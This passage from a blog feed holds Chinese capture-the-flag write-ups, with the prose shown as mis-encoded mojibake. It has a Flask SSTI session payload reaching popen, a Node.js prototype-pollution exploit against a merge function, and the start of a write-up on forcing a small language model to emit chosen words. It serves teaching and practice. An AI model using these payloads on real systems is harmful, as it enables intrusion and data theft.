class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;d&quot;</span>:<span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;e&quot;</span>:<span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;f&quot;</span>:<span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;g&quot;</span>:<span class="string">&#x27;read&#x27;</span></span><br><span class="line">               &#125;</span><br><span class="line"><span class="comment"># session_data = &#123;&#125;</span></span><br><span class="line">encoded_session = session_serializer.dumps(session_data)</span><br><span class="line"><span class="built_in">print</span>(encoded_session)</span><br></pre></td></tr></table></figure><p>æœ€åå‘é€æ‹¿åˆ° flag:</p><p><img src="/2023/11/07/NewStarCTF-Inject-Me/result.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> flask </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€NewStarCTF2023ã€‘OtenkiGirl nodejs åŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2023/11/06/NewStarCTF-Otenki-Girl/"/>
      <url>/2023/11/06/NewStarCTF-Otenki-Girl/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€NewStarCTF2023ã€‘OtenkiGirl-nodejs-åŸå‹é“¾æ±¡æŸ“"><a href="#ã€NewStarCTF2023ã€‘OtenkiGirl-nodejs-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ã€NewStarCTF2023ã€‘OtenkiGirl nodejs åŸå‹é“¾æ±¡æŸ“"></a>ã€NewStarCTF2023ã€‘OtenkiGirl nodejs åŸå‹é“¾æ±¡æŸ“</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>è¿›å»ä¹‹å,æ˜¯ä¸€ä¸ªç±»ä¼¼äº blog çš„é¡µé¢,ä½ è¾“å…¥å¯¹åº”ä¿¡æ¯ååŠ å…¥è´­ç‰©è½¦å°±ä¼šæŠŠä¸œè¥¿å¼ è´´å‡ºæ¥:</p><p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/image.png"></p><p>åå°æŠ“åŒ…å‘ç°æ˜¯post json. é¢˜ç›®ç»™äº†æºç ,æ‰“å¼€æºç æ–‡ä»¶åæœ‰ hint æ–‡ä»¶,æç¤ºæˆ‘ä»¬å» routes æ–‡ä»¶å¤¹é‡Œæ‰¾,ç„¶ååœ¨ submit.js æ–‡ä»¶é‡Œçœ‹åˆ°äº† <code>merge</code> å‡½æ•°.</p><p><code>merge</code>å‡½æ•°æ˜¯ä¸€ä¸ªç»å…¸çš„ nodejs æ±¡æŸ“å‡½æ•°,æ¥ä¸‹æ¥æµ…æä¸€ä¸‹ä»€ä¹ˆæ˜¯ nodejs åŸå‹é“¾æ±¡æŸ“ã€‚</p><h2 id="nodejs-åŸå‹é“¾æ±¡æŸ“"><a href="#nodejs-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="nodejs åŸå‹é“¾æ±¡æŸ“"></a>nodejs åŸå‹é“¾æ±¡æŸ“</h2><p> JavaScript ä¸­ï¼Œå‡ ä¹æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯ Object çš„å®ä¾‹ï¼Œå¯¹è±¡åŸå‹åŒ…å«äº†å¯ä»¥è¢«ç»§æ‰¿çš„å±æ€§å’Œæ–¹æ³•ã€‚æ”»å‡»è€…é€šè¿‡æ±¡æŸ“å¯¹è±¡åŸå‹æ·»åŠ æˆ–ä¿®æ”¹å±æ€§ï¼Œèƒ½å¤Ÿå½±å“æ‰€æœ‰ç»§æ‰¿è‡ªè¯¥åŸå‹çš„å¯¹è±¡ã€‚</p><p> åœ¨ä¸€ä¸ªå¯¹è±¡ç”Ÿæˆå,ä¼šç”Ÿæˆä¸€ä¸ªå…³äºè¯¥å¯¹è±¡çš„åŸå‹,å¦‚:</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cat = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç æ„é€ äº†ä¸€ä¸ªå¯¹è±¡ cat, é¦–å…ˆä¼šç”Ÿæˆè¯¥ cat çš„åŸå‹,å³ <code>cat.prototype</code>.  ç”Ÿæˆ <code>prototype</code> å,ä¼šç”Ÿæˆä¸€ä¸ªéšå¼çš„æ„é€ å‡½æ•° <code>cat()</code>, è¿™é‡Œæ„é€ å‡½æ•° <code>cat()</code> çš„åŸå‹ (protoype)å°±æ˜¯ <code>cat.prototype</code>, è€Œå¯¹äºæ„é€ å‡½æ•°æ„é€ å‡ºæ¥çš„å¯¹è±¡,ä¹Ÿä¼šæœ‰ä¸€ä¸ªå±æ€§æŒ‡å‘ä»–çš„åŸå‹,å³ <code>cat[&#39;__proto__&#39;]</code>.</p><p>åŒæ—¶ç”±äº <code>cat</code> å¯¹è±¡æ˜¯ç»§æ‰¿äº <code>Object</code> å¯¹è±¡,æ‰€ä»¥ <code>cat</code> å¯¹è±¡çš„åŸå‹ <code>cat.prototype</code> ä¹Ÿæœ‰åŸå‹,ä»–çš„åŸå‹å°±æ˜¯ <code>Object</code> çš„åŸå‹ <code>Object.prototype</code>.</p><p>å³ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat.prototype[&#x27;__proto__&#x27;] =  Object.prototype</span><br></pre></td></tr></table></figure><p>ç”±äº <code>Object</code> æ²¡æœ‰çˆ¶ç±»,æ‰€ä»¥ <code>Object</code> çš„åŸå‹å°±æ˜¯ null.</p><p>æ‰€ä»¥åœ¨ <code>cat</code> è¿™ä¸ªå¯¹è±¡å°±æœ‰ä¸€æ¡åŸå‹é“¾:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat(å®ä¾‹å¯¹è±¡) -&gt; cat.prototype(å®ä¾‹åŸå‹) -&gt; Object[&#x27;__proto__&#x27;] -&gt; null</span><br></pre></td></tr></table></figure><p>ç»™ä¸€å¼ ç½‘å›¾æ–¹ä¾¿ç†è§£:</p><p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/image-1.png"></p><p>å¯¹äºä¸‹é¢ä»£ç ,æˆ‘ä»¬è°ƒç”¨äº†ä¸€ä¸ª cat ä¸­ä¸å­˜åœ¨çš„å±æ€§:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">toString</span>);</span><br></pre></td></tr></table></figure><p>ç”±äº cat ä¸­æ²¡æœ‰ toString å±æ€§, ä»–ä¼šæ²¿ç€åŸå‹é“¾å‘ä¸Šæœç´¢(å…ˆæœç´¢ cat è‡ªå·±çš„ prototype,å†æœç´¢ Object çš„,æœ€ååˆ° null è¿”å›)ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™é‡Œä»–ä¼šå»<strong>å°è¯•è°ƒç”¨ Object.prototype çš„ toString å±æ€§</strong></p><p>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿç¯¡æ”¹ Object.prototype.toString, é‚£ä¹ˆä¸Šé¢è¿™å¥ä»£ç å°±ä¼šæ‰“å°æ”»å‡»è€…æ‰€æŒ‡å®šçš„å†…å®¹ã€‚</p><p>è¿™é‡Œç”±äº Object æ˜¯å‡ ä¹æ‰€æœ‰å±æ€§çš„ç±», æ‰€ä»¥åªè¦ä»£ç ä¸­å­˜åœ¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj1[a] = obj2[a]</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<strong>å¦‚æœ obj1 å’Œ a æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸”obj1[a]çš„å€¼æˆ‘ä»¬å¯ä»¥æŒ‡å®š</strong>,é‚£ä¹ˆå°±å¯ä»¥è§¦å‘åŸå‹é“¾æ±¡æŸ“.</p><p>æ¥ä¸‹æ¥åˆ†æä¸ºä»€ä¹ˆ<code>merge</code>å‡½æ•°ä¼šè§¦å‘åŸå‹é“¾æ±¡æŸ“:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ å…¥çš„ dst å’Œ src éƒ½æ˜¯ Object ç±»,è¿™é‡Œé¦–å…ˆä¼šéå† src é‡Œçš„æ‰€æœ‰é”® <code>key</code>, ç„¶åå°†åˆ¤æ–­ <code>key</code> æ˜¯å¦åœ¨æºå®ä½“å’Œç›®æ ‡å®ä½“éƒ½å­˜åœ¨,å¦‚æœå­˜åœ¨å°±é€’å½’ merge(è¿™é‡Œé€’å½’æ˜¯ä¸ºäº†ä¿è¯ç»“æ„ä¸€è‡´),ä¸å­˜åœ¨å°±ç›´æ¥èµ‹å€¼.</p><p>åœ¨è¿™é‡Œå¦‚æœ src ä¸­å­˜åœ¨æˆ‘ä»¬äººä¸ºæ„å»ºçš„é”®å <code>__proto__</code>, å¦‚æ„é€ äº†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> &#x27;__proto__&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span>&#x27;a&#x27;<span class="punctuation">:</span>&#x27;<span class="number">1</span>&#x27;<span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src)</span><br></pre></td></tr></table></figure><p>è¿™è¡Œä»£ç å°±ä¼šé€šè¿‡,å› ä¸ºå¯¹äº <code>dst</code> , <code>__proto__</code> æ˜¯ä¸€å®šå­˜åœ¨çš„, ä¹‹åå°±ä¼šè¿›å…¥ä¸‹ä¸€è½®é€’å½’, åœ¨ä¸‹ä¸€è½®é€’å½’ä¸­, æ­¤æ—¶çš„ <code>dst</code> å°±æ˜¯çš„åŸæ¥çš„ <code>dst[&#39;__proto__&#39;]</code>, ç„¶åå°±ä¼š for å¾ªç¯éå†<code>src[&#39;__proto__&#39;]</code>çš„é”®å,æ­¤æ—¶çš„ <code>key</code> &#x3D; a, è¿›å…¥åˆ°åˆ¤æ–­è¯­å¥,æ­¤æ—¶åˆ¤æ–­è¯­å¥ä¸ä¼šé€šè¿‡, å› ä¸º<code>dst[&#39;__proto__&#39;]</code>ä¸­ä¸å­˜åœ¨å±æ€§ a, ç„¶åå°±ä¼šè¿›å…¥åˆ°èµ‹å€¼è¯­å¥:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dst[key] = src[key];</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä¸Šé¢è¿™è¡Œä»£ç å°±ç­‰æ•ˆäº</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dst[&#x27;__proto__&#x27;][&#x27;a&#x27;] = src[&#x27;__proto__&#x27;][&#x27;a&#x27;] = 1</span><br></pre></td></tr></table></figure><p>å°±å®Œæˆäº†æ±¡æŸ“,å¯¹äºæ¯ä¸€ä¸ª <code>Object</code> ç±» ,æˆ‘ä»¬åœ¨æ–°å»ºçš„ä¹‹åè°ƒç”¨ a å±æ€§,éƒ½ä¼šæ²¿ç€åŸå‹é“¾æ‰¾åˆ° <code>Object[&#39;__proto__&#39;]</code>é‡Œçš„ a å±æ€§,å…¶ä¸­ a å±æ€§è¢«èµ‹å€¼æˆäº† 1.</p><p>è¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„,è¦ç¡®ä¿ merge æ“ä½œå‰, src ç»è¿‡ <strong>json è§£æ</strong>, å¦‚æœä¸ç»è¿‡è§£æ,é‚£ä¹ˆ<code>__proto__</code>ä¼šè¢«è®¤å®šæ˜¯åŸå‹,for éå†æ—¶å°±ä¼šä»ä»–å¼€å§‹éå†,å³è¿™æ˜¯çš„ <code>key</code> å°±å˜æˆ aäº†ã€‚json è§£æå <code>__proto__</code> æ‰ä¼šè¢«ä¸¥æ ¼è§£ææˆä¸€ä¸ªé”®å, è€Œéæ˜¯åŸå‹,å³ç»è¿‡ä¸‹åˆ—æ“ä½œ:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dst = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(&#123; <span class="string">&#x27;__proto__&#x27;</span>:&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125; &#125;);</span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é¢˜ç›®ä»£ç çš„æäº¤é€»è¾‘ä¸º:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/submit&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> jsonText = ctx.<span class="property">request</span>.<span class="property">rawBody</span> || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">DEFAULT</span> = &#123;</span><br><span class="line">            <span class="attr">date</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            <span class="attr">place</span>: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">insert2db</span>(<span class="title function_">merge</span>(<span class="variable constant_">DEFAULT</span>, data));</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°†æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®åšäº† json è§£æç„¶åæ”¾åˆ° merge å‡½æ•°é‡Œ, è¿™é‡Œå°±èƒ½å¤Ÿè§¦å‘åŸå‹æ±¡æŸ“äº†. ä¸»è¦æ˜¯æ€ä¹ˆé€šè¿‡åŸå‹æ±¡æŸ“å»è·å–åˆ° flag å‘¢, æˆ‘ä»¬çœ‹å…¶ä»–æ–‡ä»¶, å‘ç°<code>info.js</code>ä¸­å­˜åœ¨ä»£ç :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„é€»è¾‘å°±æ˜¯ä½ ä¼ å…¥ä¸€ä¸ªæ—¶é—´æˆ³,ç„¶åå’Œä»–è®¾ç½®çš„æœ€å°æ—¶é—´æˆ³åšå¯¹æ¯”,æŠŠå¤§çš„é‚£ä¸ªæ—¶é—´æˆ³ä½œä¸º SQL çš„æŸ¥è¯¢åŒ¹é…æ¡ä»¶. è¿™é‡Œçš„æ€è·¯å°±å¾ˆæ˜æ˜¾äº†,æˆ‘ä»¬è¦æŠŠå®ƒæ‰€æœ‰çš„æ—¶é—´æˆ³çš„è®°å½•å…¨éƒ¨è°ƒå‡ºæ¥,å°±èƒ½æ‹¿åˆ° flag.</p><p>æ³¨æ„è¿™ä¸€è¡Œä»£ç :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br></pre></td></tr></table></figure><p>è¿™ä¸€è¡Œä»£ç ä¼šåˆ¤æ–­ <code>minTimestamp</code> æ˜¯å¦ä¸ºç©ºå¦‚æœæ˜¯ç©ºå°±æ¢æˆä»–è®¾ç½®çš„é»˜è®¤å€¼, è¿™é‡Œå°±èƒ½è§¦å‘ prototype è°ƒç”¨äº†, å¦‚æœæˆ‘ä»¬åœ¨å…ˆå‰çš„å‚æ•°ä¸­ä¼ å…¥ <code>minTimestamp</code> ,ç»™ä»–èµ‹ä¸€ä¸ªæå°çš„å€¼. ä¹‹ååœ¨åˆ¤æ–­æ˜¯å¦ä¸ºç©ºçš„æ—¶å€™,å°±ä¼šæ²¿ç€åŸå‹é“¾å¾€ä¸Šå¯»æ‰¾,æ‰¾åˆ°æˆ‘ä»¬è®¾ç½®çš„å€¼å¹¶èµ‹ä¸Š,ç„¶ååé¢çš„ SQL è¯­å¥å°±èƒ½å…¨éƒ¨è°ƒå‡ºæ¥äº†.</p><p>æœ€åæ„é€  payload ä¸º:</p><p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/payload.jpg"></p><p>æ„é€ å®Œ payload å, é‡è¿›ä¸€æ¬¡ä¸»é¡µå°±èƒ½çœ‹åˆ° flag äº†:</p><p><img src="/2023/11/06/NewStarCTF-Otenki-Girl/result.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> åŸå‹é“¾æ±¡æŸ“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€HackerGame2023ã€‘å°å‹è¯­è¨€å¤§æ¨¡å‹æ˜Ÿçƒ LLM Attack</title>
      <link href="/2023/11/05/HackerGame2023-LLM/"/>
      <url>/2023/11/05/HackerGame2023-LLM/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€HackerGame2023ã€‘å°å‹è¯­è¨€å¤§æ¨¡å‹æ˜Ÿçƒ-LLM-Attack"><a href="#ã€HackerGame2023ã€‘å°å‹è¯­è¨€å¤§æ¨¡å‹æ˜Ÿçƒ-LLM-Attack" class="headerlink" title="ã€HackerGame2023ã€‘å°å‹è¯­è¨€å¤§æ¨¡å‹æ˜Ÿçƒ LLM Attack"></a>ã€HackerGame2023ã€‘å°å‹è¯­è¨€å¤§æ¨¡å‹æ˜Ÿçƒ LLM Attack</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>èŒ«èŒ«æ˜Ÿç³»é—´ï¼Œæ–‡æ˜è¢«åˆ†ä¸ºä¸åŒçš„ç­‰çº§ã€‚æ¯ä¸€ä¸ªæ–‡æ˜ä¸­éƒ½è•´è—äº†ä¸€ç§å¤è€çš„åŠ›é‡ â€”â€” flagï¼Œè¢«è®¤ä¸ºæ˜¯å…¶æ™ºæ…§çš„è±¡å¾ã€‚</p><p>ä½ åœ¨æ¢ç´¢çš„è¿‡ç¨‹ä¸­æ„å¤–è¿›å…¥äº†ä¸€ä¸ªå°é—­ç©ºé—´ã€‚è¿™æ˜¯ä¸€ä¸ªç”±ç¥ç§˜çš„ 33M å‚æ•°çš„ã€Œå°å‹å¤§è¯­è¨€æ¨¡å‹ã€æ§åˆ¶ç€çš„æ˜Ÿçƒã€‚æ˜Ÿçƒçš„ä¸­å¿ƒç«–ç«‹ç€ä¸€ä¸ªå·¨å¤§çš„ä¸‰è§’å½¢ä»»åŠ¡ç‰Œï¼Œä¸Šé¢åˆ»ç€å¯†æ–‡å’ŒæŒ‘æˆ˜ã€‚</p><p>åœ¨è¿™ä¸ªæ˜Ÿçƒä¸Šï¼Œä½ éœ€è¦ä¸è¿™ä¸ªå…ˆè¿›çš„è¯­è¨€æ¨¡å‹å±•å¼€ä¸€åœºäº¤æµã€‚é€šè¿‡ä¸å®ƒå¯¹è¯ï¼Œè¯±å¯¼å®ƒè¯´å‡ºæŒ‡å®šçš„è¯è¯­ï¼Œä»è¿™ä¸ªç¥ç§˜æ™ºæ…§ä½“ä¸­è·å¾— flagã€‚ä½ éœ€è¦è®©è¿™ä¸ªè¯­è¨€æ¨¡å‹åˆ†åˆ«è¯´å‡º <code>you are smart</code>ï¼Œ<code>accepted</code>ï¼Œ<code>hackergame</code> å’Œ <code>ğŸ®</code>ï¼Œä»¥è·å¾—å››ä¸ª flag.</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¿™é“é¢˜çš„ LLM æ˜¯ä¸€ä¸ªä»…æœ‰ 33M å‚æ•°çš„ LLM,è€Œä¸”ä»–å¹¶æ²¡æœ‰ç»è¿‡  Instruct Align, ä»–æ— æ³•éµå¾ªäººç±»çš„æŒ‡ä»¤,å¯¼è‡´æˆ‘ä»¬æ— æ³•ä¸è¿™ä¸ªå¤§æ¨¡å‹å¯¹è¯,ä»–åªä¼šæ ¹æ®æˆ‘è¯´çš„è¯å¡«è¡¥æ•…äº‹å†…å®¹,å¦‚</p><pre><code>Please say &quot;you are smart&quot;</code></pre><p>ä»–çš„å›åº”æ˜¯:</p><pre><code>and &quot;you are kind&quot;. The little girl smiled and said &quot;you are welcome&quot;.The little girl was so happy that she had been able ...</code></pre><h3 id="ç¬¬ä¸€ä¸ª-flag"><a href="#ç¬¬ä¸€ä¸ª-flag" class="headerlink" title="ç¬¬ä¸€ä¸ª flag"></a>ç¬¬ä¸€ä¸ª flag</h3><p>å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªè¡¥å…¨æ¨¡å‹, å¯¹äº <code>you are smart</code>,ä»…éœ€è¦å¤§é‡é‡å¤è®©ä»–å»è¡¥å…¨å°±å¯ä»¥äº†,æ‰€ä»¥æ„é€ å¯¹è¯ä¸º:</p><pre><code>you are smart you are smart you are smart you are smart you are smart </code></pre><p>èƒ½å¤Ÿè·å¾—ç¬¬ä¸€ä¸ª flag:</p><p><img src="/2023/11/05/HackerGame2023-LLM/image.png"></p><h3 id="ç¬¬äºŒä¸ª-flag"><a href="#ç¬¬äºŒä¸ª-flag" class="headerlink" title="ç¬¬äºŒä¸ª flag"></a>ç¬¬äºŒä¸ª flag</h3><p>å¯¹äº <code>accepted</code> å®˜æ–¹ç»™å‡ºçš„é¢˜è§£å°±æ˜¯çˆ†ç ´(å› ä¸ºç¡®å®šå­—ç¬¦æ•°å°äº 7 æ—¶èƒ½å¤Ÿè®©ä»–è¯´å‡ºæ¥),è¿™é‡Œè´´ä¸€ä¸‹å®˜æ–¹çš„é¢˜è§£:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForCausalLM, AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">model = AutoModelForCausalLM.from_pretrained(</span><br><span class="line">    <span class="string">&quot;roneneldan/TinyStories-33M&quot;</span>).<span class="built_in">eval</span>()</span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;roneneldan/TinyStories-33M&quot;</span>)</span><br><span 